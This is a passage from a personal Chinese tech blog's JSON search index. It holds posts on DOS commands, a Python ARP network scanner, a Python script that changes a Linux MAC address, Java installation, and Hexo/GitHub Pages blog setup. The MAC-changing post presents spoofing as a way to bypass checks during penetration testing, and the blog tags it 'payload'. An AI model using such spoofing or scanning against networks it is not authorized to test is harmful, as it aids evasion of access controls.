#查看所有计划任务\nattrib 文件名(目录名) #查看某文件或目录的属性\nattrib 文件名 -A -R -S -H 或 +A +R +S +H   #去掉(添加)某文件的存档，只读，系统，隐藏属性\n\n批处理文件就是将一些DOS命令写好，并将其放到后缀为.bat的文件里。\n计划命令太多了，不写了查看这个连接就行：https://blog.csdn.net/weixin_34128237/article/details/93049391\n\n","slug":"DOS命令","date":"2021-09-26T10:03:04.000Z","categories_index":"windows基础","tags_index":"DOS命令","author_index":"Longw"},{"id":"8144d90f97aac2df03b3e52cffae8156","title":"开发网络扫描器","content":"\n\n用Python开发网络扫描器网络扫描器简介我们直接看百度的结果：\n​         迅速发展的Internet给人们的生活、工作带来了巨大的方便，但同时，也带来了一些不容忽视的问题，网络信息的安全保密问题就是其中之一。　　网络的开放性以及的是造成网络不安的主要原因。科学家在设计Internet之初就缺乏对安全性的总体构想和设计，我们所用的TCP/IP 协议是建立在可信的环境之下，首先考虑的是网络互连，它是缺乏对安全方面的考虑的。而且TCP/IP协议是完全公开的，远程访问使许多者无须到现场就能够得手，连接的主机基于互相信任的原则等等这一些性质使网络更加不安全。　　先进的技术是实现网络信息安全的有力武器，这些技术包括:密码技术、身份验证技术、访问控制技术、安全内核技术、网络反病毒技术、信息泄漏防治技术、防火墙技术、网络安全漏洞扫描技术、检测技术等。而在系统发生安全事故之前对其进行预防性检查，及时发现问题并予以解决不失为一种很好的办法，于是网络安全漏洞扫描技术应运而生。\n用Python编写网络扫描器程序话不多说，直接干，首先了解一下scapy这个库的ARP模块：\n#!&#x2F;usr&#x2F;bin&#x2F;env python\n# -*- coding: utf-8 -*-\n# @Time :2021-09-15 14:15\n# @Author : longw\n# @File : network_scanner_argparse.py\n# @Software : PyCharm\n\n\nimport scapy.all as scapy\n\ndef scan(ip): # 广播ip地址\n\tscapy.arping(ip) \n\nscan(&quot;192.168.253.2&quot;)  #路由地址\n\n\n想要知道路由地址，直接在Linux主机终端输入：\nroute -n\n\n来看下程序执行结果：\n图片1……………正在输入中。。。。。。。","slug":"开发网络扫描器","date":"2021-09-20T10:54:58.000Z","categories_index":"开发网络扫描器","tags_index":"payload","author_index":"Longw"},{"id":"f125174ab074d2773620490648712dee","title":"修改MAC地址","content":"\n\n通过Python修改Linux主机的MAC地址为什么要修改MAC地址进行渗透测试时，可以修改mac地址来绕过某些验证。。。。。。。\n\n我们先来看一下MAC地址，我们输入：\nifconfig\n\n\n这个ether后面的就是我们的MAC地址，MAC地址的长度为48位(6个字节)，通常表示为12个16进制数。\n通过ifconfig指令修改MAC地址先来看下如何通过ifconfig指令来修改MAC地址，输入：\nifconfig eth0 down    #用来关闭网络连接\nifconfig eth0 hw ether 00:11:22:33:44:44    #修改MAC地址为00:11:22:33:44:44\nifconfig eth0 up   #用来开启网络连接\n\n我这里连的是无线网，所以是修改eth0，而有些人会有一个无线接口wlan0只需将eth0修改为wlan0就行了。通过以上指令我们再次输入ifconfig就会发现MAC地址已经修改完成了：\n\n这里可能会提醒你，你的权限不够只需以root权限运行指令就行了。\n通过Python来完成修改MAC地址我们先建立一个Python文件，命名为mac_change.py。建好之后现在前面加上这两行代码：\n#!usr&#x2F;bin&#x2F;env python\n# -*- coding: utf-8 -*-\n\n第一句是告诉系统应当如何执行这个文件，第二句是添加默认编码格式。然后我们导入第一个库：\nimport subprocess\n\n这个库是用来开启一个子进程执行我们的命令。因为我们要对MAC地址进行修改，所以这个库是必要的。\n非常简单只需利用它其中一个模块：\nsubprocess.call(([&quot;ifconfig&quot;, &quot;eth0&quot;, &quot;down&quot;]))\nsubprocess.call(([&quot;ifconfig&quot;, &quot;eth0&quot;, &quot;hw&quot;, &quot;ether&quot;, &quot;00:11:22:33:44:55&quot;]))\nsubprocess.call(([&quot;ifconfig&quot;, &quot;eth0&quot;, &quot;up&quot;]))\n\n然后我们直接运行程序。成功后，再次输入ifconfig：\n\n可以看到，我们成功的利用Python程序修改了MAC地址。这是直接运行，我们也可以在终端运行：\ncd PycharmProjects&#x2F;mac_change&#x2F;     #先到达程序目录\n\npython3 mac_change.py          #运行程序\n\nifconfig                    #查看\n\n\n可以看到，成功通过终端运行程序修改MAC地址程序。\n让用户输入修改信息修改MAC地址这是我们的主要程序已经实现，但是我们想自己修改eth0和wlan0就得去修改程序。这样非常麻烦。所以我们可通过输入信息，来达到修改的目的，定义两个变量接收我们的输入：\ninterface &#x3D; input(&quot;请输入要修改的接口 &gt; &quot;)\nnew_mac &#x3D; input(&quot;请输入新的MAC地址 &gt; &quot;)\n\nsubprocess.call(([&quot;ifconfig&quot;, interface, &quot;down&quot;]))\nsubprocess.call(([&quot;ifconfig&quot;, interface, &quot;hw&quot;, &quot;ether&quot;, new_mac]))\nsubprocess.call(([&quot;ifconfig&quot;, interface, &quot;up&quot;]))\n\n再次运行：\n\n成功完成通过输入修改MAC地址。当然这样的程序并不是太好看，我们可以通过定义函数来达到功能实现的效果：\ninterface &#x3D; input(&quot;请输入要修改的接口 &gt; &quot;)\nnew_mac &#x3D; input(&quot;请输入新的MAC地址 &gt; &quot;)\n\ndef change_mac(interface,new_mac):\n    print(&quot;[+] Change MAC address for &quot; + interface + &quot; to &quot; + new_mac)\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;down&quot;]))\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;hw&quot;, &quot;ether&quot;, new_mac]))\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;up&quot;]))\n\nchange_mac(interface,new_mac)\n\n还给与了用户提示信息，再次通过终端运行它：\n\n再次成功完成。这样看起来就有点脚本的感觉了。当然我们还可以对它进行更近一步的优化，这里就不讲了，写好的代码放在下面：\n#!usr&#x2F;bin&#x2F;env python\n# -*- coding: utf-8 -*-\n\nimport subprocess\nimport optparse\nimport re\n\n\ndef change_mac(interface, new_mac):\n    print(&quot;[+] Change MAC address for &quot; + interface + &quot; to &quot; + new_mac)\n    # 这是防止用户随意输入的方法\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;down&quot;]))\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;hw&quot;, &quot;ether&quot;, new_mac]))\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;up&quot;]))\n\n\ndef get_arguments():\n    # 给予用户帮助信息\n    parser &#x3D; optparse.OptionParser()\n    parser.add_option(&quot;-i&quot;, &quot;--interface&quot;, dest&#x3D;&quot;interface&quot;, help&#x3D;&quot;Interface to change its MAC address &quot;)\n    parser.add_option(&quot;-m&quot;, &quot;--mac&quot;, dest&#x3D;&quot;new_mac&quot;, help&#x3D;&quot;New MAC address &quot;)\n    (options, arguments) &#x3D; parser.parse_args()\n    if not options.interface:\n        parser.error(&quot;[-] 请指定一个interface,或者使用--help查看帮助 &quot;)\n    elif not options.new_mac:\n        parser.error(&quot;[-] 请指定一个new_mac,或者使用--help查看帮助 &quot;)\n    return options\n\n\ndef get_current_mac(interface):\n    ifconfig_result &#x3D; subprocess.check_output([&quot;ifconfig&quot;, interface])\n    mac_address_search_result &#x3D; re.search(r&quot;\\w\\w:\\w\\w:\\w\\w:\\w\\w:\\w\\w:\\w\\w&quot;, str(ifconfig_result))\n    # str(ifconfig_result) 这是python3\n    if mac_address_search_result:\n        return mac_address_search_result.group(0)\n    else:\n        print(&quot;[-] 无法读取MAC地址&quot;)\n\n\noptions &#x3D; get_arguments()\ncurrent_mac &#x3D; get_current_mac(options.interface)\nprint(&quot;Current MAC &#x3D; &quot;+str(current_mac))\n\nchange_mac(options.interface, options.new_mac)\n\ncurrent_mac &#x3D; get_current_mac(options.interface)\nif current_mac &#x3D;&#x3D; options.new_mac:\n    print(&quot;[+] MAC地址修改成功:&quot;+current_mac)\nelse:\n    print(&quot;MAC地址修改失败&quot;)\n\n\n","slug":"修改MAC地址","date":"2021-09-10T14:29:28.000Z","categories_index":"修改MAC地址","tags_index":"payload","author_index":"Longw"},{"id":"3c31ab40e966953ecfabe666f24c6141","title":"java安装","content":"\n\n安装Java集成环境JDK与JRE  JRE是Java的运行环境，是运行Java程序所必要的。而JDK是Java的开发环境，它里面就包含了JRE，所以我们学习Java就必须安装JDK。（这里的版本是Windows的）\nJDK安装首先，我们访问这个网址：https://www.oracle.com/cn/java/technologies/javase-downloads.html\n进去后，我们将看到如下界面：\n\n接着，我们往下翻看到Java SE 8下面有个Oracle JDK在下面有个JDK Download。我们点击它进入下面这个界面：\n\n这里讲一下，目前为止Java 8这个版本都是最流行，最稳定也是最适合我们学习的。我们往下翻看到：\n\n然后我们点击下载链接，接着会弹出同意链接，我们点击同意后继续下载。接着会弹出登录页面，有Oracle账户直接登录，没有我们就选择注册就行了。都是中文，把该填的都填上就行了。然后我们就可以下载了。等到下载好了之后，我们双击它进行安装。安装时，最开始的默认位置我们不要改：\n\n直接下一步，接着会安装JRE，同样安装到默认文件夹里，点击下一步：\n\n安装好之后，我们需要查看一下是否安装成功。win+r打开cmd，在里面输入：\njava -version\n\n出现以下页面代表安装成功了：\n\n测试Java程序现在我们还没有安装Java的程序编写工具，我们先用记事本书写第一个Java程序：\npublic class HelloWorld&#123;\n        public static void main(String[] args)&#123;\n                System.out.println(&quot;HelloWorld!&quot;);\n        &#125;\n&#125;\n\n在记事本里输入一下代码，然后我们保存为HelloIWorld.java格式的文件。接着在盘符里新建一个Javatest文件夹并将我们写好的Java文件放到这个Javatest文件夹里面。我们直接在文件夹目录地址上输入cmd，回车：\n\n进入后我们输入这行代码，将我们写好的Java文件进行编译：\njavac HelloWorld.java\n\n回车发现，显示javac不是内部命令提示。这是就需要配置环境变量了。打开我们安装Java的文件夹，打开如下路径：C:\\Program Files\\Java\\jdk1.8.0_301\\bin  我们复制这个路径。右键此电脑选择属性，在搜索框搜索环境变量，我们选择编辑账户的环境变量，我们选择中间的新建，添加变量名为JAVA_HOME,地址为：C:\\Program Files\\Java\\jdk1.8.0_301     确定。接着我们点击path，选择编辑，选择新建，输入：**%JAVA_HOME%\\bin**。接着我们保存就好。\n配置好环境变量后，我们在重新从文件夹里打开cmd，再次输入：\njavac HelloWorld.java\n\n这时我们发现没有问题。打开文件夹发现多了一个HelloWorld.class的文件，这就是Java文件的编译文件。在cmd中我们再输入：\njava HelloWorld\n\n发现成功输出：\n\n需要记住的一点是，每当我们修改.java文件里的程序内容，我们都需要对它再次进行编译，不然我们执行的永远是以前编译好的程序内容。\nEclipse的下载和安装Eclipse的下载和安装我们打开这个链接：https://www.eclipse.org/downloads/ 。打开之后，我们往下滑找到那个长方形的大的黄色按钮，我们选择下面的那个：Download Packages。接着在新页面我们选择：\n\n点击进入下载页面，然后我们点击Download进行下载。接着就是耐性等待下载完成。\n下载完成后我们将它解压到我们有空余空间的盘符里。如放到D盘的根目录，接下来我们双击运行程序\n发现需要我们选择工作区，就是Java文件的保存位置。我们可以在D盘新建一个workspace文件夹，然后将路径改到那个文件夹的位置。选择launch运行，看到欢迎页面。到此位置以及安装成功了。\n现在我们为方便以后写代码，修改一下字号：**Windows—–&gt;preferences——-&gt;General——-&gt;Appearance——–&gt;Colos and Fonts—–&gt;Basic————-&gt;Text Font————-&gt;Edit…**。选择自己想要的字体和字号就行。\n但是要注意不要选择带有@符号的，会导致中文字体倾斜。\n\n","slug":"java安装","date":"2021-09-05T10:37:40.000Z","categories_index":"Java安装","tags_index":"Java","author_index":"Longw"},{"id":"10e502baa80f2697db123aad5a708fe1","title":"关于如何建立blog","content":"\n\n关于如何建立向我这样子的博客1.首先需要搭建环境npm和node.js的安装我们直接安装nvm,用它来安装及管理node.js和npm。\n下载地址：https://github.com/coreybutler/nvm-windows/releases\n对应的系统下载对应的最新版本就行了，我是用的windows直接下载nvm-setup.zip，下载完成后直接双击运行。默认安装就行，期间修改安装路径放到你想安装的盘里。C盘够大的话放在C盘也没什么问题，我C盘内存不太大就放在D盘里面了。\n\n由于我已经安装完成就不放截图了，傻瓜式安装大家都会。\n安装完成后，win+r打开cmd输入nvm即可查看当前版本的相关信息，如图所示：\n\n接下来，我们需要安装node.js，node.js自带npm。运行命令：\nnvm install 12.14.0\n\n这里需要注意的是，安装的版本不要太高，不然等你修改主题的时候发现不匹配就糟糕了。我这里安装12.14.0版本，适配了我这个主题。\n\n安装完成后来看几条nvm的命令：\n查看node.js版本的，能看到你安装了几个node\nnvm list    \n\n使用node.js的版本\nnvm use 12.14.0\n\n卸载node.js版本\nnvm uninstall 12.14.0\n\n安装完成就可以输入使用命令了，注意如果你这里使用不了，那就是你没有将node.js添加到环境变量里。因为一般是默认就配置好了，我这边就不讲了，有问题看这边：https://www.cnblogs.com/mmit/p/12623348.html\nhexo安装接下来就是我们的神器hexo的安装了，它将自动帮助我们生成一个默认的博客框架。安装的时候就要用到我们刚才安装node.js的时候自带的npm了，打开cmd输入：\nnpm install -g cnpm --registry&#x3D;http:&#x2F;&#x2F;registry.npm.taobao.org\n\n回车安装，这里使用了淘宝的源安装cnpm，这样安装速度快一点。这里我们耐心等待安装完成就行了。安装好之后输入命令：\ncnpm install -g hexo-cli\n\n用来安装hexo，等待安装完成后就可以输入：\nhexo -v\n\n查看hexo的版本信息，出现如下界面时就表示安装成功了：\n\nGit安装现在就来安装Git，这是我们用将博客布置到github上的工具。至于其他的功能有兴趣后面可以自己摸索。安装的方法可用这个连接查看：https://blog.csdn.net/qq_39377418/article/details/95199800?ops_request_misc=%7B%22request%5Fid%22%3A%22159022752019724839242812%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=159022752019724839242812&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_v3-1-95199800.first_rank_ecpm_v1_pc_rank_v3&amp;utm_term=git%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B+windows\n下载新版本安装时，安装配置文件选项跟链接里有些不一样，实在不知道怎么办可以下载与链接里相同的版本就行了。\n2.生成hexo默认版本博客在前面安装好Git之后我们还需要对它进行配置。首先我们需要github的账号，因为我们需要在github上寄存我们的博客，以便我们在公网上对它进行访问。在注册好github账号后。我们双击Git运行它，输入这两条命令：  \nname是你的github账号     &#x65;&#x61;&#x6d;&#105;&#108;&#64;&#x71;&#x71;&#x2e;&#x63;&#x6f;&#x6d;是你的邮箱\ngit config --global user.name &quot;name&quot;\ngit config --global user.email &quot;eamil@qq.com” \n\n接下来就轻松了，我们在自己的盘符中建立一个文件夹blog用来存放我们hexo博客的默认文件。win+r进入cmd，我们将路径转到建好的文件夹blog中，输入命令：\nhexo init\n\n来初始化配置默认博客文件。如果不成功，可能是Git的环境变量没有配置好，去配置好继续输入命令就行。当出现 INFO Start blogging with Hexo！就代表你已经配置成功了。\n继续输入cmd命令：\nhexo s\n\n在本地运行博客，我们将会在localhost：4000中预览我们的博客：\n\n页面不一样很正常，我这里对主题进行了配置。反正你肯定能看到helloworld这篇文章，这是默认生成的。\n到这里，你的博客已经生成好了。接下来，就是将博客部署到github项目库里，让我们能通过链接访问。\n3.将博客部署到github上首先，我们需要用到一个插件。在cmd中输入命令：\ncnpm install hexo-deployer-git --save\n\n进行安装，安装完成后。我们要在空荡荡的github主页上建立我们的第一个项目库。他的名字叫做：\ngithubname.github.io这里的githubname是你的github的账户名。使用chrome登录到github中，在右边头像里选择Your repositories—-&gt;选择new—–&gt;在Repository name 中填写上我们的项目名字—–&gt;直接到下面带点Create repository 即可创建完成。\n其次，我们到blog文件夹中修改**_config.yml** 文件，用记事本打开即可，ctrl+f打开搜索，查找deploy：。然后我们对它进行配置。如图：\n\n你只需修改repo为你自己的GitHub项目库地址就行。可以在Your repositories—-&gt;选择建好的项目库名字进入详情页——–&gt;点击code就会出现链接地址，我们只需将它复制粘贴即可。\n最后，就是将项目部署到github库中.win+r输入cmd，转到blog路径。不会的例子如下图：\n\n进入路径后我们只需要输入命令：\nhexo d\n\n接下来输入账号密码即可，要输入两次。注意：\n你将会看到下面这句错误提示：remote: Support for password authentication was removed on August 13, 2021. 这是因为github将密码换成了token。你必须生成自己的token替换成密码才能将项目部署到github上。生成token教程如下：\n选择头像里的setting——-&gt;选择Developer setting——&gt;选择personal access token—–&gt;选择create new token。之后我们需要设置token的有效期和权限范围，这是可以用chrome自带的翻译查看选项意思，当然rope选项是一定要选择的。然后选择Generate token将会生成token，这个时候一定要将token复制保存起来，以防止后面我们刷新后找不到了。现在我们再次使用命令 hexo d 在上传时填写密码的第二次操作时将我们的token放到密码输入行里，出现Branch ‘master’ set up to track remote branch ‘master’from’https://github.com/liao545/liao545.github.io.git&#39;.的提示时，代表上传成功了。为了防止麻烦我们可以输入命令：\ngit remote set-url origin https:&#x2F;&#x2F;&lt;your_token&gt;@github.com&#x2F;&lt;USERNAME&gt;&#x2F;&lt;REPO&gt;.git\n\n其中，your_token为你自己生成的token，USERNAME为你github的账户名，REPO 为你的项目库的名字。这样就可以将仓库和token进行绑定，以避免我们重复输入token的操作。部署完成后我们就可以通过项目地址链接对我们的博客进行访问：https://GithubUsername.github.io。\n\n4.绑定域名通过上面的链接，我们可以正常访问我们的博客了。接下来就是如何通过我们自己的专属域名来访问我们的博客了。\n购买域名首先，我们要先去购买一个域名，我以华为云为例。我们注册华为云账号，进行实名认证，不认证你是无法购买域名的。全中文页面，如何购买我就不讲了。购买完成后，要进行信息模板的建立，在域名注册菜单下选择信息模板，添加默认信息模板即可。当审核完成后，我们的域名才会过户到我们的默认模板下。\n域名解析其次，我们进行域名解析，公网解析，选择管理解析，再选择快速添加解析。在出现页面中输入我们博客地址的IP地址即可。IP地址获取我们可以通过win+r输入cmd，再输入ping liao545.github.io 即可获取，完成后将出现两个新的解析条例，他们的属性都是A，我们对其头文件为www的属性修改为CNAME，并将下面地址改为自己购买的域名，如我的就是liaowblog.com。如此我们就完成了域名的解析，一般第二天就会完全生效。\n将域名与github项目绑定最后，就是将我们的域名和github项目进行绑定，以便我们通过域名访问博客。先在我们的blog文件夹中新建一个文本文档，在里面输入www.你的域名，保存后，出来将文档重命名为CNAME，注意没有后缀。然后我们在github项目详情页面点Add file —&gt;create new file—&gt;名字跟上面一样为CNAME，内容也是www.你的域名—–&gt;然后我们创建即可。当修改生效后，我们就可以通过www.你的域名来访问你的博客了。\n5.结尾大致的步骤都在上面了，不会的出错的就按照步骤名和错误提示在网上搜索一下。那我们后续如何书写博客呢？下载一个Typora或者其他的编辑器。用来对md文档进行编辑，然后我们在blog下输入cmd命令：\nhexo new post &lt;title&gt;\n\n然后，title为你的文件名，这样就会在blog—&gt;source—&gt;_post里面生成一个title.md的文件，通过下载好的编辑器对他进行修改即可，打开后里面会有一段代码，包括你的文章名和日期。写好之后，就可以通过以下几条命令上传到我们的博客中了：\nhexo clean\n\nhexo g\n\nhexo d\n\n分别是，清除缓存，生成静态文件，以及上传到github文件。再次访问我们的www.你的域名即可查看新写的博客了。\n\n","slug":"关于如何建立blog","date":"2021-08-21T13:09:42.000Z","categories_index":"博客建立","tags_index":"博客","author_index":"Longw"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2021-08-18T06:43:13.628Z","categories_index":"","tags_index":"","author_index":"Longw"}]